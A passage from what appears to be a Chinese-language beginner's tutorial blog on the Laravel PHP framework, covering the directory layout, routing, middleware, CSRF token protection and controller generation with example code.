class="hljs-comment">#网站根目录INSTALL_DIR即为安装目录</span><br>  &lt;Directory <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;INSTALL_DIR&#125;</span>/www/&quot;</span>&gt;<br>    Options +Indexes +Includes +FollowSymLinks +MultiViews  <span class="hljs-comment">#根目录显示目录结构</span><br>    AllowOverride All <span class="hljs-comment"># 重写规则的定义.适用于所有文件的访问.</span><br>    Require <span class="hljs-keyword">local</span><br>  &lt;/Directory&gt;<br>&lt;/VirtualHost&gt;<br></code></pre></div></td></tr></table></figure><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>laravel是基于mvc模式的php框架，m——模型层，v——视图层，c——控制器层；以下为laravel框架的目录文件，框出来的文件目录将在后续中用到</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">｜–　app 包含Controller、Model、路由等在内的应用目录，大部分业务将在该目录下进行<br>    ｜　　｜–　Console 命令行程序目录<br>    ｜　　｜　　｜–　Commands 包含了用于命令行执行的类，可在该目录下自定义类<br>    ｜　　｜　　｜–　Kernel.php 命令调用内核文件，包含commands变量(命令清单，自定义的命令需加入到这里)和schedule方法(用于任务调度，即定时任务)<br>    ｜　　｜–　Events 事件目录<br>    ｜　　｜–　Exceptions 包含了自定义错误和异常处理类<br>    ｜　　｜–　Http HTTP传输层相关的类目录<br>    ｜　　｜　　｜–　Controllers 控制器目录<br>    ｜　　｜　　｜–　Middleware 中间件目录<br>    ｜　　｜　　｜–　Requests 请求类目录<br>    ｜　　｜　　｜–　Kernel.php 包含http中间件和路由中间件的内核文件<br>    ｜　　｜　　｜–　routes.php 强大的路由<br>    ｜　　｜–　Jobs 该目录下包含队列的任务类<br>    ｜　　｜–　Listeners 监听器目录<br>    ｜　　｜–　Providers 服务提供者目录<br>    ｜　　｜–　User.php 自带的模型实例，我们新建的Model默认也存储在该目录<br>    ｜–　bootstrap 框架启动载入目录<br>    ｜　　｜–　app.php 创建框架应用实例<br>    ｜　　｜–　autoload.php 自动加载<br>    ｜　　｜–　cache 存放框架启动缓存，web服务器需要有该目录的写入权限<br>    ｜–　config 各种配置文件的目录<br>    ｜　　｜–　app.php 系统级配置文件<br>    ｜　　｜–　auth.php 用户身份认证配置文件，指定好table和model就可以很方便地用身份认证功能了<br>    ｜　　｜–　broadcasting.php 事件广播配置文件<br>    ｜　　｜–　cache.php 缓存配置文件<br>    ｜　　｜–　compile.php 编译额外文件和类需要的配置文件，一般用户很少用到<br>    ｜　　｜–　database.php 数据库配置文件<br>    ｜　　｜–　filesystems.php 文件系统配置文件，这里可以配置云存储参数<br>    ｜　　｜–　mail.php 电子邮件配置文件<br>    ｜　　｜–　queue.php 消息队列配置文件<br>    ｜　　｜–　services.php 可存放第三方服务的配置信息<br>    ｜　　｜–　session.php 配置session的存储方式、生命周期等信息<br>    ｜　　｜–　view.php 模板文件配置文件，包含模板目录和编译目录等<br>    ｜–　database 数据库相关目录<br>    ｜　　｜–　factories <span class="hljs-number">5.1</span>以上版本的新特性，工厂类目录，也是用于数据填充<br>    ｜　　｜　　｜–　ModelFactory.php 在该文件可定义不同Model所需填充的数据类型<br>    ｜　　｜–　migrations 存储数据库迁移文件<br>    ｜　　｜–　seeds 存放数据填充类的目录<br>    ｜　　　　　｜–　DatabaseSeeder.php 执行php artisan db:seed命令将会调用该类的run方法。该方法可调用执行该目录下其他Seeder类，也可调用factories方法生成ModelFactory里定义的数据模型<br>    ｜–　<span class="hljs-keyword">public</span> 网站入口，应当将ip或域名指向该目录而不是根目录。可供外部访问的css、js和图片等资源皆放置于此<br>    ｜　　｜–　index.php 入口文件<br>    ｜　　｜–　.htaccess Apache服务器用该文件重写URL<br>    ｜　　｜–　web.config IIS服务器用该文件重写URL<br>    ｜–　resources 资源文件目录<br>    ｜　　｜–　assets 可存放包含LESS、SASS、CoffeeScript在内的原始资源文件<br>    ｜　　｜–　lang 本地化文件目录<br>    ｜　　｜–　views 视图文件就放在这啦<br>    ｜–　storage 存储目录。web服务器需要有该目录及所有子目录的写入权限<br>    ｜　　｜–　app 可用于存储应用程序所需的一些文件<br>    ｜　　｜–　framework 该目录下包括缓存、sessions和编译后的视图文件<br>    ｜　　｜–　logs 日志目录<br>    ｜–　tests 测试目录<br>    ｜–　vendor 该目录下包含Laravel源代码和第三方依赖包<br>    ｜–　.env 环境配置文件。config目录下的配置文件会使用该文件里面的参数，不同生产环境使用不同的.env文件即可。<br>    ｜–　artisan 强大的命令行接口，你可以在app/Console/Commands下编写自定义命令<br>    ｜–　composer.json 存放依赖关系的文件<br>    ｜–　composer.lock 锁文件，存放安装时依赖包的真实版本<br>    ｜–　gulpfile.js gulp（一种前端构建工具）配置文件<br>    ｜–　package.json gulp配置文件<br>    ｜–　phpspec.yml phpspec（一种PHP测试框架）配置文件<br>    ｜–　phpunit.xml phpunit（一种PHP测试框架）配置文件<br>    ｜–　server.php PHP内置的Web服务器将把这个文件作为入口。以<span class="hljs-keyword">public</span>/index.php为入口的可以忽略掉该文件<br></code></pre></div></td></tr></table></figure><p>app是应用的核心代码文件目录，以后的代码基本都在这里完成；app/Http/Controller目录是应用的控制器文件；routes.php是框架的路由文件，负责路由分配和映射；Http下的类文件，比如上面目录中的User.php、Menu.php文件是应用的模型文件；config目录是所有应用的配置文件目录；public是框架的入口文件及静态资源文件目录；resources/views则是应用的视图文件目录。</p><h2 id="关于路由"><a href="#关于路由" class="headerlink" title="关于路由"></a>关于路由</h2><p>在 Laravel 应用中，定义路由有两个入口，一个是 <code>routes/web.php</code>，用于处理终端用户通过 Web 浏览器直接访问的请求，另一个是 <code>routes/api.php</code>，</p><p>get请求和post请求</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    Route::get(/test1,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;);<br>    Route::post(/test1,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;); <br>     <span class="hljs-comment">//两种访问方式页面返回hello</span><br><br>Route::get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;WelcomeController@index&#x27;</span>); 访问/时调用App\Http\Controllers\WelcomeController 控制器的 index 方法<br>        <br></code></pre></div></td></tr></table></figure><p>关于多路由访问有match和any方式</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Route::match([<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;post&#x27;</span>], <span class="hljs-string">&#x27;multi&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;multi post or get&#x27;</span>;<br>  &#125;);<br>Route::any(<span class="hljs-string">&#x27;multi&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;multi get or post&#x27;</span>;<br>  &#125;);<br></code></pre></div></td></tr></table></figure><h4 id="路由参数"><a href="#路由参数" class="headerlink" title="路由参数"></a>路由参数</h4><p>如果你定义的路由需要传递参数，只需要在路由路径中进行标识并将其传递到闭包函数即可：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;user/&#123;id&#125;&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户ID: &quot;</span> . <span class="hljs-variable">$id</span>;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>这样，当你访问 <code>http://blog.test/user/1000</code> 的时候，就可以在浏览器看到 <code>用户ID: 1000</code> 字符串。</p><p>此外，你还可以定义可选的路由参数，只需要在参数后面加个 <code>?</code> 标识符即可，同时你还可以为可选参数指定默认值：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;user/&#123;id?&#125;&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$id</span> = <span class="hljs-number">1</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户ID: &quot;</span> . <span class="hljs-variable">$id</span>;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>这样，如果不传递任何参数访问 <code>http://blog.test/user</code>，则会使用默认值 <code>1</code> 作为用户 ID。更深入的用法还可以用正则匹配</p><h4 id="路由分组"><a href="#路由分组" class="headerlink" title="路由分组"></a>路由分组</h4><p>所谓路由分组，其实就是通过 <code>Route::group</code> 将几个路由聚合到一起，然后给它们应用对应的共享特征：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::group([], <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; <br>    Route::get(<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello&#x27;</span>; &#125;); <br>    Route::get(<span class="hljs-string">&#x27;world&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;World&#x27;</span>; &#125;); <br>&#125;);<br></code></pre></div></td></tr></table></figure><h4 id="路由别名"><a href="#路由别名" class="headerlink" title="路由别名"></a>路由别名</h4><p>　给路由通过[‘as’ =&gt; ‘alias’]数组使用别名后，可通过route(‘别名’)生成url，请看代码理解：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <br> <span class="hljs-comment">//路由别名</span><br>  <br> Route::get(<span class="hljs-string">&#x27;student/info&#x27;</span>,[<span class="hljs-string">&#x27;as&#x27;</span> =&gt; <span class="hljs-string">&#x27;studentInfo&#x27;</span> ,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-comment">//通过route(&#x27;studentInfo&#x27;)生成完成url后返回</span><br>      <span class="hljs-keyword">return</span> route(<span class="hljs-string">&#x27;studentInfo&#x27;</span>);<br> &#125;]);<br> <br> <br> 访问url：http:<span class="hljs-comment">//127.0.0.1/laravel/public/student/info</span><br> 页面返回：http:<span class="hljs-comment">//127.0.0.1/laravel/public/student/info</span><br> 注：别名的好处在于，以后在控制器中使用route(<span class="hljs-string">&#x27;别名&#x27;</span>)的方式生成url后，即便修改了路由的名字，也不用再修改控制器程序，因为通过别名程序能自动生成修改后的url<br></code></pre></div></td></tr></table></figure><p>具体还有<code>路由路径前缀</code>, <code>子域名路由</code>,<code>子命名空间</code>,<code>路由命名前缀</code>。可以看看laravel官方手册</p><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>中间件为过滤进入应用的 HTTP 请求提供了一套便利的机制。例如，Laravel 内置了一个中间件来验证用户是否经过认证（如登录），如果用户没有经过认证，中间件会将用户重定向到登录页面，而如果用户已经经过认证，中间件就会允许请求继续往前进入下一步操作。</p><p>当然，除了认证之外，中间件还可以被用来处理很多其它任务。比如：CORS 中间件可以用于为离开站点的响应添加合适的头（跨域）；日志中间件可以记录所有进入站点的请求，从而方便我们构建系统日志系统。</p><p>Laravel 框架自带了一些中间件，包括认证、CSRF 保护中间件等等。所有的中间件都位于 <code>app/Http/Middleware</code> 目录下。</p><h4 id="定义中间件"><a href="#定义中间件" class="headerlink" title="定义中间件"></a>定义中间件</h4><p>这个命令会在 <code>app/Http/Middleware</code> 目录下创建一个新的中间件类 <code>CheckAge</code>，在这个中间件中，我们只允许提供的 <code>age</code> 大于 200 的请求才能访问应用该中间件的路由，否则，我们会将用户重定向到 <code>/</code> URI：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Middleware</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Closure</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckAge</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Handle an incoming request.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Illuminate\Http\Request  $request</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Closure  $next</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span>(<span class="hljs-params"><span class="hljs-variable">$request</span>, <span class="hljs-built_in">Closure</span> <span class="hljs-variable">$next</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request</span>-&gt;age &lt;= <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$next</span>(<span class="hljs-variable">$request</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>正如你所看到的，如果请求参数中的 <code>age</code> 小于等于 200，中间件会返回一个 HTTP 重定向给客户端；否则，请求会被传递下去。将请求往下传递可以通过调用回调函数 <code>$next</code> 并传入当前 <code>$request</code>。</p><p>理解中间件的最好方式就是将中间件看做 HTTP 请求到达目标动作之前必须经过的“层”，每一层都会检查请求并且可以完全拒绝它。所有的中间都是在<a href="https://laravelacademy.org/post/21965">服务容器</a>中解析，所以你可以在中间件的构造函数中类型提示任何依赖。</p><p>具体还有<code>请求之前/之后的中间件</code>,<code>注册中间件</code>,<code>中间件参数</code>等。</p><h2 id="CSRF防护"><a href="#CSRF防护" class="headerlink" title="CSRF防护"></a>CSRF防护</h2><p>简单地说，csrf就是攻击者伪装用户来攻击授信网站。</p><p>在laravel中防护csrf用的时csrf令牌，其实就是用token或者cookie来验证请求输入的 token 值和 Session 中存储的 token 是否一致，如果没有传递该字段或者传递过来的字段值和 Session 中存储的数值不一致，则会抛出异常。</p><h2 id="控制器入门"><a href="#控制器入门" class="headerlink" title="控制器入门"></a>控制器入门</h2><p>可以通过artisan命令快速创建一个控制器</p><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss">php artisan <span class="hljs-built_in">make</span>:controller TakeController<br></code></pre></div></td></tr></table></figure><p>该命令会在 <code>app/Http/Controllers</code> 目录下创建一个新的名为 <code>TaskController.php</code> 的文件，默认生成的控制器代码如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Controllers</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShowController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//该方法用于将 user 变量渲染到 user/profile 视图中。然后在 user 目录下新建 profile.blade.php 文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params">User <span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> view(<span class="hljs-string">&#x27;user.profile&#x27;</span>, [<span class="hljs-string">&#x27;user&#x27;</span> =&gt; <span class="hljs-variable">$user</span>]); <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="单一动作控制器"><a href="#单一动作控制器" class="headerlink" title="单一动作控制器"></a>单一动作控制器</h4><p>用<code>__invoke</code> 方法：</p><p>例如可在上述类中定义</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> view(<span class="hljs-string">&#x27;user.profile&#x27;</span>, [<span class="hljs-string">&#x27;user&#x27;</span> =&gt; User::findOrFail(<span class="hljs-variable">$id</span>)]);<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>当你为这个单动作控制器注册路由的时候，不需要指定方法：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;user/&#123;user&#125;&#x27;</span>, \App\Http\Controllers\ShowController::class);<br></code></pre></div></td></tr></table></figure><h4 id="控制器中间件"><a href="#控制器中间件" class="headerlink" title="控制器中间件"></a>控制器中间件</h4><p><code>Route::get(&#39;profile&#39;, [UserController::class, &#39;show&#39;])-&gt;middleware(&#39;auth&#39;);</code></p><p>不过，在控制器的构造函数中设置中间件更方便，你可以使用基类提供的 <code>middleware</code> 方法轻松分配中间件给该控制器的动作，你甚至可以限制中间件只应用到该控制器类的指定方法：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;middleware(<span class="hljs-string">&#x27;auth&#x27;</span>); <span class="hljs-comment">// auth 中间件会应用到所有方法 </span><br>        <span class="hljs-keyword">$this</span>-&gt;middleware(<span class="hljs-string">&#x27;log&#x27;</span>)-&gt;only(<span class="hljs-string">&#x27;index&#x27;</span>); <span class="hljs-comment">// log 中间件只会应用到 index 方法</span><br>        <span class="hljs-keyword">$this</span>-&gt;middleware(<span class="hljs-string">&#x27;subscribed&#x27;</span>)-&gt;except(<span class="hljs-string">&#x27;store&#x27;</span>); <span class="hljs-comment">// subscribed 中间件会应用到 store 之外的所有方法</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="资源控制器"><a href="#资源控制器" class="headerlink" title="资源控制器"></a>资源控制器</h4><p>命令创建</p><p><code>php artisan make:controller PostController --resource</code></p><p>该 Artisan 命令将会生成一个控制器文件 <code>app/Http/Controllers/PostController.php</code>，这个控制器包含了每一个资源操作对应的方法：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Controllers</span>;<br>    <br><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;<br>    <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PostController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Display a listing of the resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Show the form for creating a new resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Store a newly created resource in storage.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Illuminate\Http\Request  $request</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">store</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Display the specified resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Show the form for editing the specified resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Update the specified resource in storage.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Illuminate\Http\Request  $request</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 